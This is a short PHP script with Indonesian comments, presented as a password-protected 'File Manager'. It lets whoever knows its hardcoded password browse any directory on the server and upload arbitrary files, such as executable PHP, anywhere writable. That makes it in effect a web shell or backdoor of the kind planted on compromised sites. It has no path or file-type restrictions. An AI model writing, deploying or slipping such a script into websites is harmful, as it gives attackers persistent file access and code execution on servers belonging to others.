<?php
// Ganti password di sini
$password = "Bos010122@";

// Autentikasi manual
session_start();
if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $password) {
        $_SESSION['logged_in'] = true;
    } else {
        echo '<form method="post"><input type="password" name="pass" placeholder="Enter Password"><input type="submit" value="Login"></form>';
        exit;
    }
}

// File Manager
$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$dir = realpath($dir);
$files = scandir($dir);

echo "<h2>📁 File Manager - " . htmlspecialchars($dir) . "</h2>";

// Upload form
echo "<form method='post' enctype='multipart/form-data'>
Upload file: <input type='file' name='file'>
<input type='submit' value='Upload'>
</form>";

if (isset($_FILES['file'])) {
    $filename = basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $dir . '/' . $filename)) {
        echo "<p>✅ Uploaded: $filename</p>";
    } else {
        echo "<p>❌ Upload failed</p>";
    }
}

// List files
echo "<ul>";
foreach ($files as $file) {
    if ($file === '.') continue;
    $path = $dir . DIRECTORY_SEPARATOR . $file;
    $link = "?dir=" . urlencode($path);
    echo "<li><a href='$link'>" . htmlspecialchars($file) . "</a></li>";
}
echo "</ul>";

// Logout link
echo "<p><a href='?logout=1'>Logout</a></p>";
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
}
?>
